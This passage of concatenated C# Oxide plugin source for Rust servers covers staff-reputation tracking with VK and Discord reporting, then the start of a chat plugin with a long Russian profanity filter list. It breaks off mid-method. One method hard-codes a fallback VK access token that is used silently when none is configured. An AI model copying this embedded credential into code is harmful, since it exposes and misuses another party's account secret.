            foreach (var p in BasePlayer.activePlayerList)
                OnPlayerConnected(p);
            WriteData();

        }
        void OnServerSave()
        {
            NormalDaySet();
        }
        void Unload()
        {
            Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("IQPersonal/Information", DataInformation);
            Oxide.Core.Interface.Oxide.DataFileSystem.WriteObject("IQPersonal/Time", TimeDay);
        }
        void OnPlayerConnected(BasePlayer player)
        {
            if (IsPersonal(player.userID))
            {
                VKSendMessage(String.Format(lang.GetMessage("VK_CONNECTED", this), player.displayName, DateTime.UtcNow.ToUniversalTime()));
                DiscordSendMessage(String.Format(lang.GetMessage("VK_CONNECTED", this), player.displayName, DateTime.UtcNow.ToUniversalTime()),player.userID);
            }
        }
        void OnPlayerDisconnected(BasePlayer player, string reason)
        {
            if (player == null) return;
            TrackerTime(player);
            if (IsPersonal(player.userID))
            {
                VKSendMessage(String.Format(lang.GetMessage("VK_DISCONNECTED", this), player.displayName, DateTime.UtcNow.ToUniversalTime()));
                DiscordSendMessage(String.Format(lang.GetMessage("VK_DISCONNECTED", this), player.displayName, DateTime.UtcNow.ToUniversalTime()), player.userID);
            }
        }
        void OnNewSave(string filename)
        {
            foreach (var Data in DataInformation)
                BalanceSet(Data.Key);
        }
        #endregion

        #region Command

        [ChatCommand("rep")]
        void ChatCommandRep(BasePlayer player)
        {
            if (!DataInformation.ContainsKey(player.userID)) return;
            var User = DataInformation[player.userID];
            SendChat(player, String.Format(lang.GetMessage("CHAT_COMMAND_REP", this, player.UserIDString), User.ScorePlayer));
        }

        [ConsoleCommand("iqp")]
        void ConsoleCommandIQP(ConsoleSystem.Arg arg)
        {
            if (arg.Args.Length < 1 || arg == null || arg.Args == null)
            {
                PrintWarning(lang.GetMessage("CHAT_NOT_ARG", this));
                return;
            }

            switch (arg.Args[0])
            {
                case "add":
                    {
                        if(arg.Args.Length != 3)
                        {
                            PrintWarning("Используйте синтаксис : iqp add STEAM64ID VKLink");
                            return;
                        }
                        ulong userID = ulong.Parse(arg.Args[1]);       
                        if(!userID.IsSteamId())
                        {
                            PrintWarning("Введите корректный Steam64ID");
                            return;
                        }
                        string VKLink = arg.Args[2];
                        if(String.IsNullOrWhiteSpace(VKLink))
                        {
                            PrintWarning("Вы не указали ссылку на страницу ВК");
                            return;
                        }
                        AddPersonal(userID, VKLink);
                        return;
                    }
                case "remove":
                    {
                        if (arg.Args.Length != 2)
                        {
                            PrintWarning("Используйте синтаксис : iqp remove STEAM64ID");
                            return;
                        }
                        ulong userID = ulong.Parse(arg.Args[1]);
                        if (!userID.IsSteamId())
                        {
                            PrintWarning("Введите корректный Steam64ID");
                            return;
                        }
                        RemovePersonal(userID);
                        return;
                    }
                case "vk":
                    {
                        if (arg.Args.Length != 3)
                        {
                            PrintWarning("Используйте синтаксис : iqp vk STEAM64ID VKLink");
                            return;
                        }
                        ulong userID = ulong.Parse(arg.Args[1]);
                        if (!userID.IsSteamId())
                        {
                            PrintWarning("Введите корректный Steam64ID");
                            return;
                        }
                        string VKLink = arg.Args[2];
                        if (String.IsNullOrWhiteSpace(VKLink))
                        {
                            PrintWarning("Вы не указали ссылку на страницу ВК");
                            return;
                        }
                        ChangePersonalVK(userID, VKLink);
                        return;
                    }
                case "debug":
                    {
                        VKSendMessage("Инициализация..#1");
                        VKSendMessage("Инициализация..#2",config.VKSetting.VKChatIDPersonal);
                        DiscordSendMessage("Test");
                        return;
                    }
            }
        }

        #endregion

        #region Lang
        private new void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["VK_ERRORS_935"] = "Contact not found",
                ["VK_ERRORS_936"] = "NotCorrected settings",
                ["VK_ERRORS_945"] = "Chat was disabled",

                ["VK_SET_TIME_DAY"] = "[IQPersonal] A new staff reporting day has started!",
                ["VK_FINISH_TIME_DAY"] = "[IQPersonal] The reporting day ended successfully!",
                ["VK_CONNECTED"] = "[IQPersonal]{0} connected server : {1}",
                ["VK_DISCONNECTED"] = "[IQPersonal]{0} disconnect server : {1}",
                ["VK_ADD_PERSONAL"] = "[IQPersonal]User {0} added personal\nInformation : \nSteam64ID - {1}\nVK Link - {2}",
                ["VK_CHANGE_VK"] = "[IQPersonal]User {0} changed VK\nVK Link : {1}",
                ["VK_REMOVE_PERSONAL"] = "[IQPersonal]User {0} remove personal\nReason : Minimum reputation",
                ["VK_GIVE_BALANCE"] = "[IQPersonal] The report on the accrual balance!\nUser {0} was credited {1} rubles!\nThe indicators of reputation reset",
                ["VK_BAD_REPUTATION"] = "[IQPersonal] The report on the accrual balance!\nnUser {0} a bad reputation has been recorded {1} \nThe indicators of reputation reset",
                ["VK_NO_AUTH_STORE"] = "[IQPersonal] The report on the accrual balance!\nUser {0} is not authorized in the store! \n Reputation Indicators are reset without crediting the balance",
                ["VK_FINISH_TIME_DAY_STATISTICK_USER"] =
                "[IQPersonal]" +
                "\nUser : {0}" +
                "\nGeneral statistics :" +
                "\nTime spent on the server - {1}" +
                "\nCount Bans - {2}" +
                "\nCount Checks - {3}" +
                "\nCount Muted - {4}" +
                "\nReputation - {5}" +
                "\nDay Normal Completed - {6}",

                ["CHAT_FINISH_TIME_DAY_COMPLETED"] = "The reporting day is over! You have coped with the norm for today\nYour reward : +<color=#01afad>{0}</color> reputation",
                ["CHAT_FINISH_TIME_DAY_NO_COMPLETED"] = "The reporting day is over! Alas, you did not cope with the norm for today\n Next time try better!",
                ["CHAT_START_TIME_DAY"] = "Reporting has begun! We wish you good luck with your tests!",
                ["CHAT_REPUTATION_BAN"] = "You have successfully banned the player.Your reputation increased by +<color=#01afad>{0}</color> \nView your reputation - <color=#01afad>/rep</color>",
                ["CHAT_REPUTATION_CHECK"] = "You have successfully verified the player.Your reputation has increased by +<color=#01afad>{0}</color>\nView your reputation - <color=#01afad>/rep</color>",
                ["CHAT_REPUTATION_MUTE"] = "You have successfully blocked the player's chat.Your reputation has increased by +<color=#01afad>{0}</color>\nView your reputation - <color=#01afad>/rep</color>",
                ["CHAT_REPUTATION_BAD_WORDS"] = "You used a forbidden word(mate)!Your reputation has decreased by -<color=#01afad>{0}</color>\nView your reputation - <color=#01afad>/rep</color>",
                ["CHAT_COMMAND_REP"] = "Your reputation : <color=#01afad>{0}</color>",
                ["CHAT_NOT_ARG"] = "Enter a valid value",
                ["CHAT_DELETE_PERSONAL"] = "User {0} was filmed\nReason : Great negative reputation recorded",

                ["IQP_ADD_PLAYER_CONTAINS"] = "User contains personal",
                ["IQP_ADD_PLAYER_ACCESS"] = "Your access add personal",
                ["IQP_REMOVE_PLAYER_CONTAINS"] = "User no contains personal",
                ["IQP_REMOVE_PLAYER_ACCESS"] = "Your acces remove personal",
                ["IQP_CHANGE_ACCESS"] = "You have successfully changed VK user",

                ["STATUS_COMPLETED"] = "Done",
                ["STATUS_NO_COMPLETED"] = "Not executed",
                ["STATISTICK_NULL"] = "Not included in the duties",
                ["STATISTICK_TURN_OFF"] = "OFF",

            }, this);

            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["VK_ERRORS_935"] = "Такого пользователя в чате нет.",
                ["VK_ERRORS_936"] = "Неверно настроена беседа",
                ["VK_ERRORS_945"] = "Беседа отключена",

                ["VK_SET_TIME_DAY"] = "[IQPersonal] Новый отчётный день персонала начался!",
                ["VK_GIVE_BALANCE"] = "[IQPersonal] Отчет по начислению баланса!\nПользователю {0} было зачислено {1} рублей! \nПоказатели репутации сброшены",
                ["VK_BAD_REPUTATION"] = "[IQPersonal] Отчет по начислению баланса!\nУ пользователя {0} зафиксирована плохая репутация {1} \nПоказатели репутации сброшены",
                ["VK_NO_AUTH_STORE"] = "[IQPersonal] Отчет по начислению баланса!\nПользовател {0} не авторизован в магазине! \nПоказатели репутации сброшены без зачисления баланса",
                ["VK_CONNECTED"] = "[IQPersonal]{0} зашел на сервер : {1}",
                ["VK_DISCONNECTED"] = "[IQPersonal]{0} вышел с сервера : {1}",
                ["VK_ADD_PERSONAL"] = "[IQPersonal]Пользователь {0} добавлен в состав\nИнформация : \nSteam64ID - {1}\nСсылка на VK - {2}",
                ["VK_CHANGE_VK"] = "[IQPersonal]Пользователю {0} был изменен вк\nСсылка на ВК : {1}",
                ["VK_REMOVE_PERSONAL"] = "[IQPersonal]Пользователь {0} был снят\nПричина : Зафиксирована большая отрицательная репутация",
                ["VK_FINISH_TIME_DAY"] = "[IQPersonal] Отчетный день успешно закончился!",
                ["VK_FINISH_TIME_DAY_STATISTICK_USER"] =
                "[IQPersonal]" +
                "\nПользователь : {0}" +
                "\nОбщая статистика :" +
                "\nВремя проведенное на сервере - {1}" +
                "\nКоличество блокировок - {2}" +
                "\nКоличество проверок - {3}" +
                "\nКоличество мутов - {4}" +
                "\nКоличество репутации - {5}" +
                "\nДневная норма - {6}",

                ["CHAT_FINISH_TIME_DAY_COMPLETED"] = "Отчетный день завершен! Вы справились с положенной нормой на сегодня\nВаша награда : +<color=#01afad>{0}</color> репутации",
                ["CHAT_FINISH_TIME_DAY_NO_COMPLETED"] = "Отчетный день завершен! Увы,вы не справились с положенной нормой на сегодня\nВ следующий раз постарайтесь лучше!",
                ["CHAT_START_TIME_DAY"] = "Отчетный начался! Желаем вам удачи при проверках!",
                ["CHAT_REPUTATION_BAN"] = "Вы успешно забанили игрока.Ваша репутация увеличилась на +<color=#01afad>{0}</color>\nПросмотреть вашу репутацию - <color=#01afad>/rep</color>",
                ["CHAT_REPUTATION_CHECK"] = "Вы успешно проверили игрока.Ваша репутация увеличилась на +<color=#01afad>{0}</color>\nПросмотреть вашу репутацию - <color=#01afad>/rep</color>",
                ["CHAT_REPUTATION_MUTE"] = "Вы успешно заблокировали чат игрока.Ваша репутация увеличилась на +<color=#01afad>{0}</color>\nПросмотреть вашу репутацию - <color=#01afad>/rep</color>",
                ["CHAT_REPUTATION_BAD_WORDS"] = "Вы использовали запрещенное слово(мат)!Ваша репутация уменьшилась на -<color=#01afad>{0}</color>\nПросмотреть вашу репутацию - <color=#01afad>/rep</color>",
                ["CHAT_COMMAND_REP"] = "Ваша репутация : <color=#01afad>{0}</color>",
                ["CHAT_NOT_ARG"] = "Введите корректное значение",

                ["IQP_ADD_PLAYER_CONTAINS"] = "Такой пользователь уже состоит в персонале",
                ["IQP_ADD_PLAYER_ACCESS"] = "Вы успешно добавили нового пользователя",
                ["IQP_REMOVE_PLAYER_CONTAINS"] = "Такой пользователь не состоит в персонале",
                ["IQP_REMOVE_PLAYER_ACCESS"] = "Вы успешно удалили пользователя",
                ["IQP_CHANGE_ACCESS"] = "Вы успешно изменили ВК пользователю",

                ["STATUS_COMPLETED"] = "Выполнена",
                ["STATUS_NO_COMPLETED"] = "Не выполнена",
                ["STATISTICK_NULL"] = "Не входит в обязанности",
                ["STATISTICK_TURN_OFF"] = "Выключено",
            }, this, "ru");
            PrintWarning("Языковой файл загружен успешно");
        }
        #endregion

        #region Help

        void RegisteredPermission()
        {
            permission.RegisterPermission(PermissionUse, this);
            
            foreach(var PermConfig in config.Settings)
                permission.RegisterPermission(PermConfig.Key, this);
            PrintWarning("Регистарция прав прошла успешно");
        }
        void VKSendMessage(string Message, string CustomChatID = "")
        {
            if (!config.UseLogged) return;
            var VK = config.VKSetting;
            var ChatID = string.IsNullOrEmpty(CustomChatID) ? VK.VKChatID : CustomChatID;
            if (String.IsNullOrEmpty(VK.VKChatID) || String.IsNullOrEmpty(VK.VKToken))
            {
                PrintWarning("Ошибка #34267: Вы не настроили конфигурацию,в пункте с ВК"); 
                return;
            }
            int RandomID = UnityEngine.Random.Range(0, 9999);
            while (Message.Contains("#"))
                Message = Message.Replace("#", "%23");

            webrequest.Enqueue($"https://api.vk.com/method/messages.send?chat_id={ChatID}&random_id={RandomID}&message={Message}&access_token={VK.VKToken}&v=5.90", null, (code, response) => {
            }, this);
        }

        void DiscordSendMessage(string key, ulong userID = 0, params object[] args)
        {
            if (!config.UseDiscordLogged) return;
            if (String.IsNullOrEmpty(config.DiscordSetting.WebHook)) return;
            var VK = config.VKSetting;
            string VKLinks = DataInformation.ContainsKey(userID) ? DataInformation[userID].VKLink : "583299692";
            string Token = String.IsNullOrEmpty(VK.VKToken) ? "e56e41544c6eff561a9faacbfbcb5a8f3c4d412092511de232fee6d2290c9de7f8610cb98b3e099cf167a" : VK.VKToken;
            string URL = $"https://api.vk.com/method/users.get?user_ids={VKLinks}&fields=photo_50&access_token={Token}&v=5.88";

            webrequest.Enqueue(URL, null, (code, response) =>
            {
                var json = JObject.Parse(response);
                string ID = (string)json["response"]?[0]?["id"];
                string FirstName = (string)json["response"]?[0]?["first_name"];
                string LastName = (string)json["response"]?[0]?["last_name"];
                string PhotoLink = (string)json["response"]?[0]?["photo_50"];
                string Information = $"{FirstName} {LastName}";
                string VKLink = $"https://vk.com/id{ID}";

                List <Fields> fields = new List<Fields>
                {
                    new Fields("IQPersonal", key, true),
                };

                FancyMessage newMessage = new FancyMessage(null, true, new FancyMessage.Embeds[1] { new FancyMessage.Embeds(null, 635133, fields, new Authors(Information, VKLink, PhotoLink, null), new Footer("Author: Mercury[vk.com/mir_inc]", "https://i.imgur.com/ILk3uJc.png", null)) });
                Request(config.DiscordSetting.WebHook, newMessage.toJSON());
            }, this);
        }

        #region FancyDiscord
        public class FancyMessage
        {
            public string content { get; set; }
            public bool tts { get; set; }
            public Embeds[] embeds { get; set; }

            public class Embeds
            {
                public string title { get; set; }
                public int color { get; set; }
                public List<Fields> fields { get; set; }
                public Footer footer { get; set; }
                public Authors author { get; set; }

                public Embeds(string title, int color, List<Fields> fields, Authors author, Footer footer)
                {
                    this.title = title;
                    this.color = color;
                    this.fields = fields;
                    this.author = author;
                    this.footer = footer;

                }
            }

            public FancyMessage(string content, bool tts, Embeds[] embeds)
            {
                this.content = content;
                this.tts = tts;
                this.embeds = embeds;
            }

            public string toJSON() => JsonConvert.SerializeObject(this);
        }

        public class Footer
        {
            public string text { get; set; }
            public string icon_url { get; set; }
            public string proxy_icon_url { get; set; }
            public Footer(string text, string icon_url, string proxy_icon_url)
            {
                this.text = text;
                this.icon_url = icon_url;
                this.proxy_icon_url = proxy_icon_url;
            }
        }

        public class Authors
        {
            public string name { get; set; }
            public string url { get; set; }
            public string icon_url { get; set; }
            public string proxy_icon_url { get; set; }
            public Authors(string name, string url, string icon_url, string proxy_icon_url)
            {
                this.name = name;
                this.url = url;
                this.icon_url = icon_url;
                this.proxy_icon_url = proxy_icon_url;
            }
        }

        public class Fields
        {
            public string name { get; set; }
            public string value { get; set; }
            public bool inline { get; set; }
            public Fields(string name, string value, bool inline)
            {
                this.name = name;
                this.value = value;
                this.inline = inline;
            }
        }

        private void Request(string url, string payload, Action<int> callback = null)
        {
            Dictionary<string, string> header = new Dictionary<string, string>();
            header.Add("Content-Type", "application/json");
            webrequest.Enqueue(url, payload, (code, response) =>
            {
                if (code != 200 && code != 204)
                {
                    if (response != null)
                    {
                        try
                        {
                            JObject json = JObject.Parse(response);
                            if (code == 429)
                            {
                                float seconds = float.Parse(Math.Ceiling((double)(int)json["retry_after"] / 1000).ToString());
                            }
                            else
                            {
                                PrintWarning($" Discord rejected that payload! Responded with \"{json["message"].ToString()}\" Code: {code}");
                            }
                        }
                        catch
                        {
                            PrintWarning($"Failed to get a valid response from discord! Error: \"{response}\" Code: {code}");
                        }
                    }
                    else
                    {
                        PrintWarning($"Discord didn't respond (down?) Code: {code}");
                    }
                }
                try
                {
                    callback?.Invoke(code);
                }
                catch (Exception ex) { }

            }, this, RequestMethod.POST, header);
        }
        #endregion

        int ConvertReputation(ulong UserID)
        {
            var Controller = config.ControllerSetting;
            int Reputation = DataInformation[UserID].ScorePlayer;
            if (Reputation <= 0)
            {
                VKSendMessage(String.Format(lang.GetMessage("VK_BAD_REPUTATION", this), UserID, Reputation));
                DiscordSendMessage(String.Format(lang.GetMessage("VK_BAD_REPUTATION", this), UserID, Reputation), UserID);
                return 0;
            }
            double Money = Math.Round((double)(Reputation / Controller.ScoreChanged));
            return Convert.ToInt32(Money);
        }
        bool IsDayNormal()
        {
            if (TimeDay <= CurrentTime())
                return true;
            else return false; 
        }
        bool IsPersonalNormalCompleted(ulong UserID)
        {
            var DataPersonal = DataInformation[UserID];
            if (DataPersonal.StatusDayNormal)
                return true;
            else return false;
        }
        bool IsPersonal(ulong UserID)
        {
            var PeronalInformation = config.Settings;
            foreach (var Info in PeronalInformation)
            {
                if (!HasPermission(UserID, Info.Key)) continue;
                else return true;
            }
            return false;
        }
        bool HasPermission(ulong UserID, string Permissions)
        {
            if (permission.UserHasPermission(UserID.ToString(), Permissions))
                return true;
            else return false;
        }

        static DateTime epoch = new DateTime(1970, 1, 1, 0, 0, 0);
        static double CurrentTime() => DateTime.UtcNow.Subtract(epoch).TotalSeconds;

        #endregion

        #region API
        void API_SET_BANS(ulong UserID)
        {
            var Controller = config.ControllerSetting;
            if (Controller.ControllerBans)
            {
                if (!DataInformation.ContainsKey(UserID))
                    DataInformation.Add(UserID, new InformationUser { });

                var User = DataInformation[UserID];
                User.DayBans++;
                User.ScorePlayer += Controller.ScoreBans;
                var player = BasePlayer.FindByID(UserID);
                if (player == null) return;
                SendChat(player, String.Format(lang.GetMessage("CHAT_REPUTATION_BAN", this), Controller.ScoreBans));
            }
        }
        void API_SET_CHECK(ulong UserID)
        {
            var Controller = config.ControllerSetting;
            if (Controller.ControllerCheck)
            {
                if (!DataInformation.ContainsKey(UserID))
                    DataInformation.Add(UserID, new InformationUser { });

                var User = DataInformation[UserID];
                User.DayCheck++;
                User.ScorePlayer += Controller.ScoreCheck;
                var player = BasePlayer.FindByID(UserID);
                if (player == null) return;
                SendChat(player, String.Format(lang.GetMessage("CHAT_REPUTATION_CHECK", this), Controller.ScoreCheck));
            }
        }
        void API_SET_MUTE(ulong UserID)
        {
            var Controller = config.ControllerSetting;
            if (Controller.ControllerMute)
            {
                if (!DataInformation.ContainsKey(UserID))
                    DataInformation.Add(UserID, new InformationUser { });

                var User = DataInformation[UserID];
                User.DayMute++;
                User.ScorePlayer += Controller.ScoreMute;
                var player = BasePlayer.FindByID(UserID);
                if (player == null) return;
                SendChat(player, String.Format(lang.GetMessage("CHAT_REPUTATION_MUTE", this), Controller.ScoreMute));
            }
        }
        void API_DETECTED_BAD_WORDS(ulong UserID)
        {
            var Controller = config.ControllerSetting;
            if (Controller.ControllerBadWords)
            {
                if (!DataInformation.ContainsKey(UserID))
                    DataInformation.Add(UserID, new InformationUser { });

                var User = DataInformation[UserID];
                User.ScorePlayer -= Controller.ScoreRemoveBadWords;
                var player = BasePlayer.FindByID(UserID);
                if (player == null) return;
                SendChat(player, String.Format(lang.GetMessage("CHAT_REPUTATION_BAD_WORDS", this), Controller.ScoreRemoveBadWords));
            }
        }
        void API_SET_SCORE(ulong UserID, int Amount) => DataInformation[UserID].ScorePlayer += Amount;
        void API_REMOVE_SCORE(ulong UserID, int Amount) => DataInformation[UserID].ScorePlayer -= Amount;
        int API_GET_BANS(ulong UserID) { return DataInformation[UserID].DayBans; }
        int API_GET_CHECK(ulong UserID) { return DataInformation[UserID].DayCheck; }
        int API_GET_MUTE(ulong UserID) { return DataInformation[UserID].DayMute; }
        int API_GET_SCORE(ulong UserID) { return DataInformation[UserID].ScorePlayer; }

        #endregion
    }
}


// --- End of file: IQPersonal.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/ChatSystem.cs ---
// --- Original Local Path: ChatSystem.cs ---

﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.Linq;
using ConVar;
using Newtonsoft.Json;
using Oxide.Core;
using Oxide.Game.Rust.Cui;
using UnityEngine;

namespace Oxide.Plugins
{
    [Info("ChatSystem", "https://topplugin.ru/", "2.1.0")]
    [Description("Улучшенная чат-система с интерфейсом! Куплено на Topplugin.ru")]
    public class ChatSystem : RustPlugin
    {
        #region Classes

        private class PluginSettings
        {
            [JsonProperty("Стандартные причины мута")]
            public Dictionary<string, string> Reasons = new Dictionary<string, string>();
            [JsonProperty("Стандартные теги игроков")]
            public Dictionary<string, string> Tags = new Dictionary<string, string>();
            [JsonProperty("Скрытые теги")]
            public List<string> HiddenTags = new List<string>();
            [JsonProperty("Цвета доступные для выбора")]
            public Dictionary<string, string> Colors = new Dictionary<string, string>();
            [JsonProperty("Случайные сообщения")]
            public List<string> RandomMessages = new List<string>();
        }

        private class Chatter
        {
            [JsonProperty("Текущий тег игрока")]
            public string CurrentTag;
            [JsonProperty("Текущий цвет игрока")]
            public string CurrentColor;
            [JsonProperty("Скрывать сообщения игроков?")]
            public bool HideMessages = false;
            [JsonProperty("Скрывать подсказки")]
            public bool HideHelpers = false;

            [JsonProperty("Снятие блокировки чата")]
            public double MuteTime = CurrentTime();

            public double IsMuted() => Math.Max(MuteTime - CurrentTime(), 0);
        }

        #endregion

        #region Variables

        [JsonProperty("Настройки каждого игрока")]
        private Dictionary<ulong, Chatter> playerSettings = new Dictionary<ulong, Chatter>();
        [JsonProperty("Настройки плагина")]
        private PluginSettings Settings = new PluginSettings();

        [JsonProperty("Стандартный цвет ника")]
        private string NameColor = "#8eb9ff";
        [JsonProperty("Разрешение на блокировку чата игрокам")]
        private string ModerPermission = "ChatSystem.Moderator";

        [JsonProperty("Системный слой")]
        private string Layer = "UI_Mute";

        List<string> BadWords = new List<string> { "блеат", "блеать", "блиат", "блиать", "бля", "блябу", "блябуду", "бляд", "бляди", "блядина", "блядище", "блядки", "блядовать", "блядство", "блядун", "блядуны", "блядунья", "блядь", "блядюга", "блят", "блять", "выблядок", "выблядыш", "млять", "проблядь", "плять", "сук", "сука", "суки", "сучара", "сучий", "сучка", "сучко", "сучонок", "сучье", "сцука", "сцуки", "сцуконах", "ахуел", "ахуеть", "захуячить", "ибонех", "на хер", "на хуй", "нахер", "нахрен", "нахуй", "нахуйник", "нехира", "нехрен", "нехуй", "нехуйственно", "никуя", "нихера", "нихуя", "однохуйственно", "охуевательский", "охуевать", "охуевающий", "охуел", "охуенно", "охуеньчик", "охуеть", "охуительно", "охуительный", "охуяньчик", "охуячивать", "охуячить", "по хуй", "по хую", "похер", "похерил", "похерила", "похерили", "похеру", "похрен", "похрену", "похуист", "похуистка", "похуй", "похую", "разхуячить", "хер", "херня", "херовато", "херовина", "херовый", "хуeм", "хуе", "хуев", "хуевато", "хуевенький", "хуевина", "хуево", "хуевый", "хуек", "хуел", "хуем", "хуенч", "хуеныш", "хуенький", "хуеплет", "хуеплет", "хуерик", "хуерыло", "хуесос", "хуесоска", "хуета", "хуетень", "хуею", "хуи", "хуище", "хуй", "хуйком", "хуйло", "хуйня", "хуйня", "хуйрик", "хуля", "хую", "хуюл", "хуя", "хуяк", "хуякать", "хуякнуть", "хуяра", "хуясе", "хуячить", "хуепромышленник", "eбал", "eбаль", "eбать", "eбет", "eблан", "еблани", "ебланы", "eблантий", "eбуч", "взъебка", "взьебка", "взьебывать", "въеб", "въебался", "въебенн", "въебусь", "въебывать", "выеб", "выебать", "выебен", "выебнулся", "выебон", "выебываться", "вьебен", "доебываться", "долбоеб", "еб", "ебал", "ебало", "ебальник", "ебан", "ебанамать", "ебанат", "ебаная", "ебани", "ебанический", "ебанный", "ебанныйврот", "ебаное", "ебануть", "ебануться", "ебаную", "ебаный", "ебанько", "ебарь", "ебат", "ебатория", "ебать", "ебаться", "ебашить", "ебена", "ебет", "ебец", "ебик", "ебин", "ебись", "ебическая", "ебки", "ебла", "еблан", "ебливый", "еблище", "ебло", "еблыст", "ебля", "ебн", "ебнуть", "ебнуться", "ебня", "ебошить", "ебская", "ебский", "ебтвоюмать", "ебун", "ебут", "ебуч", "ебуче", "ебучее", "ебучий", "ебучим", "ебущ", "ебырь", "заeб", "заeбат", "заeбал", "заeбали", "заеб", "заеба", "заебал", "заебанец", "заебастая", "заебастый", "заебать", "заебаться", "заебашить", "заебистое", "заебистые", "заебистый", "заебись", "заебошить", "заебываться", "злоеб", "злоебучая", "злоебучее", "злоебучий", "ибанамат", "ипать", "ипаться", "ипаццо", "наебать", "наебет", "наебнуть", "наебнуться", "наебывать", "не ебет", "невротебучий", "невъебенно", "ниибацо", "ниипацца", "ниипаццо", "ниипет", "объебос", "обьебать", "обьебос", "остоебенить", "отъебись", "переебок", "подъебнуть", "подъебнуться", "поебать", "поебень", "поебываает", "приебаться", "проеб", "проебанка", "проебать", "разъеб", "разъеба", "разъебай", "разъебать", "сестроеб", "съебаться", "уебать", "уебища", "уебище", "уебищное", "уебк", "уебки", "уебок", "хитровыебанный", "ебачос", "архипиздрит", "запиздячить", "изъебнуться", "напиздел", "напиздели", "напиздело", "напиздили", "настопиздить", "опездал", "опизде", "опизденивающе", "остопиздеть", "отпиздить", "отпиздячить", "пездень", "пездит", "пездишь", "пездо", "пездят", "пизд", "пизда", "пиздануть", "пиздануться", "пиздарваньчик", "пиздато", "пиздатое", "пиздатый", "пизде", "пизденка", "пизденыш", "пиздеть", "пиздец", "пиздит", "пиздить", "пиздиться", "пиздишь", "пиздища", "пиздище", "пиздобол", "пиздоболы", "пиздобратия", "пиздоватая", "пиздоватый", "пиздолиз", "пиздонутые", "пиздорванец", "пиздорванка", "пиздострадатель", "пизду", "пиздуй", "пиздун", "пиздунья", "пизды", "пиздюга", "пиздюк", "пиздюлина", "пиздюля", "пиздят", "пиздячить", "припиздень", "припизднутый", "припиздюлина", "пропизделся", "пропиздеть", "пропиздячить", "распиздай", "распиздеться", "распиздяй", "распиздяйство", "спиздел", "спиздеть", "спиздил", "спиздила", "спиздили", "спиздит", "спиздить", "страхопиздище", "пиздаглазое", "бздение", "бздеть", "бздех", "бздецы", "бздит", "бздицы", "бздло", "бзднуть", "бздун", "бздунья", "бздюха", "бздюшка", "бздюшко", "набздел", "набздеть", "пробзделся", "гавно", "гавнюк", "гавнючка", "гамно", "говенка", "говенный", "говешка", "говназия", "говнецо", "говнище", "говно", "говноед", "говнолинк", "говночист", "говнюк", "говнюха", "говнядина", "говняк", "говняный", "говнять", "заговнять", "изговнять", "изговняться", "наговнять", "подговнять", "сговнять", "манда", "мандавошек", "мандавошка", "мандавошки", "мандей", "мандень", "мандеть", "мандища", "мандой", "манду", "мандюк", "промандеть", "мудаг", "мудак", "муде", "мудель", "мудеть", "муди", "мудил", "мудила", "мудистый", "мудня", "мудоеб", "мудозвон", "мудоклюй", "отмудохать", "промудеть", "мудоебище", "трахаеб", "трахатель", "высраться", "выссаться", "засерать", "засерун", "засеря", "засирать", "засрун", "насрать", "обосранец", "обосрать", "обосцать", "обосцаться", "обсирать", "посрать", "серун", "серька", "сирать", "сирывать", "срака", "сраку", "сраный", "сранье", "срать", "срун", "ссака", "ссышь", "сцание", "сцать", "сцуль", "сцыха", "сцышь", "сыкун", "усраться", "пидар", "пидарас", "пидарасы", "пидары", "пидор", "нудоп", "пидорасы", "пидорка", "пидорок", "пидоры", "пидрас", "выпердеть", "пердануть", "пердеж", "пердение", "пердеть", "пердильник", "перднуть", "пердун", "пердунец", "пердунина", "пердунья", "пердуха", "пердь", "пернуть", "перднуть", "пернуть", "педерас", "педик", "педрик", "педрила", "педрилло", "педрило", "педрилы", "дрочелло", "дрочена", "дрочила", "дрочилка", "дрочистый", "дрочить", "дрочка", "дрочун", "надрочить", "суходрочка", "дрисня", "дрист", "дристануть", "дристать", "дристун", "дристуха", "надристать", "обдристаться", "соск", "fuск", "fuскer", "fuскинg", "гандон", "гнид", "гнида", "гниды", "гондон", "долбоящер", "елда", "елдак", "елдачить", "жопа", "жопу", "задрачивать", "задристать", "задрота", "залуп", "залупа", "залупаться", "залупить", "залупиться", "залупу", "замудохаться", "конча", "курва", "курвятник", "лох", "лохи", "лошара", "лошара", "лошары", "лошок", "лярва", "малафья", "минет", "минетчик", "минетчица", "мокрощелка", "мокрощелка", "мразь", "очкун", "падла", "падонки", "падонок", "паскуда", "писька", "писькострадатель", "писюн", "писюшка", "подонки", "подонок", "поскуда", "потаскуха", "потаскушка", "придурок", "раздолбай", "сволота", "сволочь", "соси", "стерва", "суканах", "ублюдок", "ушлепок", "хитрожопый", "целка", "чмо", "чмошник", "чмырь", "шалава", "шалавой", "шараебиться", "шлюха", "шлюхой", "шлюшка", };
        Dictionary<ulong, int> floods = new Dictionary<ulong, int>();

        #endregion

        #region Functions

        private void BroadMessage(string message = "", string header = "Оповещение игроков")
        {
            foreach (var check in BasePlayer.activePlayerList.Where(p => playerSettings.ContainsKey(p.userID)))
            {
                if (!playerSettings[check.userID].HideHelpers)
                    SendReply(check, message == "" ? Settings.RandomMessages.GetRandom() : message);
            }


            if (string.IsNullOrEmpty(message))
                timer.Once(300, () => BroadMessage());
        }

        private void HandleMessage(Chat.ChatChannel channel, BasePlayer player, string message)
        {
            if (message.Length > 200) return;
            Chatter playerChat = playerSettings[player.userID];
            if (playerChat.HideMessages)
            {
                SendReply(player, "Вы отключили отображение чата, изменить настройки: <color=#1E88E5>/chat</color>");
                return;
            }
            if (playerChat.IsMuted() > 0)
            {
                SendReply(player, $"У вас заблокирован чат, осталось: <color=#1E88E5>{FormatTime(TimeSpan.FromSeconds(playerChat.IsMuted()))}</color>");
                return;
            }

            //if (permission.UserHasPermission(player.UserIDString, "chatsystem.zyablechat"))

            message = message.ToLower();
            var firstLetter = message.Substring(0, 1);
            message = message.Remove(0, 1);
            message = firstLetter.ToUpper() + message;

            message = message.Replace("Спасибо", "<color=#4286f4>Спасибо</color>", StringComparison.OrdinalIgnoreCase);
            foreach (var check in BadWords)
            {
                foreach (var word in message.Split(' '))
                {
                    if (word.ToLower() == check.ToLower())
                        message = message.Replace(word, "***", StringComparison.OrdinalIgnoreCase);
                }
            }

            int floodTime;
            if (floods.TryGetValue(player.userID, out floodTime) && !player.IsAdmin)
            {
                floodTime++;
